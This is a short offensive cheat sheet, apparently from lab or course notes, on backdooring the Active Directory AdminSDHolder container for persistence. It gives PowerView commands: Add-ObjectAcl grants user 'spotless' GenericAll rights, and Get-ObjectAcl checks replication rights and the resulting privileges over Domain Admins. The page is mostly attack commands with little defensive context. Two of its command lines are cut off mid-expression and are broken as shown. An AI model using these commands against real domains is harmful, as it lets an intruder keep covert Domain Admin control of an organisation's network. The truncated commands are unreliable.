# AdminSDHolder

## AdminSDHolder

AdminSDHolder is a special AD container with some "default" security permissions that is used as a template for protected AD accounts and groups (like Domain Admins, Enterprise Admins, etc.) to prevent their accidental and unintended modifications, and to keep them secure.

Once you have gained Domain Admin privileges, `AdminSDHolder` container can be abused by backdooring it by giving your user `GenericAll` privileges, which effectively makes that user a Domain Admin.

**Check if student has replication rights**

```
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ? {($_.IdentityReference 
```

**Check if user got generic all against domain admins group**

```
Get-ObjectAcl -SamaccountName “Domain Admins” –ResolveGUIDS | ?{$_.identityReference -match ‘<username>’}
```

## Execution

Backdooring the AdminSDHolder container by adding an ACL that provides user `spotless` with `GenericAll` rights for `Domain Admins` group:

```
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName spotless -Verbose -Rights All
```

Now, confirming that the user spotless has got `GenericAll` privileges against `Domain Admins` group:

```csharp
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotl
```
